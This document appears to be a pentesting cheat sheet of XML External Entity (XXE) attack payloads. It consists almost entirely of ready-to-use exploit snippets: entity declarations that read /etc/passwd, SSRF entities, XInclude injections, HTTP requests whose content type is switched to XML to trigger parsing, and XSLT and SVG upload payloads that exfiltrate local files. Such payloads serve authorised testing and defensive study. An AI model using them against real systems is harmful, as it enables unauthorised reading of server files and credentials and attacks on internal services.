# XXE

## Exploits

### File Retrieval

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<field>&xxe;</field>
```

### SSRF

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<url>/"> ]>

<field>&xxe;</field>
```

## XInclude Attack

Useful for when the attacker doesn't control the whole XML structure but can only insert values in the fields (for instance as values returned from SOAP requests or populated from forms)

Read local file

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

SSRF

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="<url>"/></foo>
```

Example request

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

var=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="<url>"/></foo>
```

## XXE Through Modified Content-Type

In same cases it might be possible to trigger XXE vulnerabilities in requests that are not formatted as XML by setting the content type header to text/xml and rewriting the body of the request in order to be digested by an XML parser

### POST Request

Original request

```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

var=value
```

Modified request

```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><var>value</var>
```

### JSON Body

Original request

```
POST /action HTTP/1.0
Content-Type: application/json
Content-Length: 38

{"search":"name","value":"val"}
```

Modified request

```
POST /action HTTP/1.0
Content-Type: application/xml
Content-Length: 288

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<search>name</search>
<value>&xxe;</value>
</root>
```

## XXE Through file upload

### XSLT

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
       <xsl:value-of select="document('<path>')">
   </xsl:value-of></xsl:template>
</xsl:stylesheet>
```

### SVG

Text will appear within the image

```
<?xml version="1.0" standalone="yes"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://<path>" > ]>
<svg width="256px" height="256px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
    <text font-size="12" x="0" y="16">&xxe;</text>
</svg>
```
